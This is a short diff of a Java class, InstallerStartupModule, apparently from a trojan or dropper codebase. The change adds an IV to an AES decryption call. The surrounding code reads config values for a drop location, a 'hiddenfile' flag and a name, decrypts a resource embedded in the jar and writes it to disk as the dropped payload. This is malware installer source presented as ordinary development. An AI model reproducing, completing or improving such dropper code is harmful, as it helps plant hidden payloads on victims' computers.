@@ -48,7 +48,7 @@ public class InstallerStartupModule extends StartupModule {
 				if (locationIndex != -1) {
 					dropLocation = locationIndex;
 				}
-				
+								
 				boolean hideFile = Boolean.parseBoolean(Configuration.getConfig().get("hiddenfile"));
 
 				String fileName = Configuration.getConfig().get("name");
@@ -129,7 +129,7 @@ public class InstallerStartupModule extends StartupModule {
 						
 						File dropfile = DropLocations.getFile(dropTarget, name + ext);						
 						
-						Cipher cipher = CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, new SecretKeySpec(Configuration.getConfigKey(), "AES"));
+						Cipher cipher = CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, new SecretKeySpec(Configuration.getConfigKey(), "AES"), Configuration.getIV());
 						InputStream is = new CipherInputStream(getClass().getResourceAsStream("/" + name + ext), cipher);
 						
 						FileOutputStream fos = new FileOutputStream(dropfile);
